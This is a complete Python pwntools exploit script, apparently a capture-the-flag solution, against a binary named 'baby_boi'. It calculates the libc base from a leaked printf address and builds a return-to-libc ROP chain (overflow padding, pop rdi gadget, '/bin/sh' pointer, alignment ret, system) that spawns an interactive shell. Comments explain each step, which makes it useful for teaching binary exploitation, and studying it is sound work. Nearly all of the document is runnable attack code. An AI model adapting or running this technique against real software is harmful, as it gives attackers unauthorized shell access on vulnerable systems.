import struct
import pwn

# baby_boi is a 64-bit dynamically-linked binary
# NX is enabled; ASLR is turned on

# This is a very easy one: We are dumped the libc address of printf
# so we just have to calculate libc base and do a basic rop

libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')

target = pwn.process('./baby_boi')
target.recvuntil("Here I am: ")

leak = target.recvline()
leak = leak.strip(b'\n')
leak = int(leak, 16)


# Subtracting the offset of printf in libc from the absolute address of printf (which was leaked) gives us base addr of libc
# FYI: libc.symbols['printf'] is the same as getting address from readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
libc_base_addr = leak - libc.symbols['printf']

# Getting system() addr in libc
system_addr = struct.pack("<Q", libc_base_addr + libc.symbols['system'])

# Offset of "/bin/sh" string in libc: 1b45bd
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
bin_sh_addr = struct.pack("<Q", libc_base_addr + 0x1b45bd)

# We need a pop rdi gadget to pass an argument to system():
pop_rdi = struct.pack("<Q", 0x0000000000400793)

# We will also need a ret for stack alignment after /bin/sh pointer
extra_ret = struct.pack("<Q", 0x0000000000400794)

payload = b'a'*40
payload += pop_rdi
payload += bin_sh_addr
payload += extra_ret
payload += system_addr

target.sendline(payload)
target.interactive()
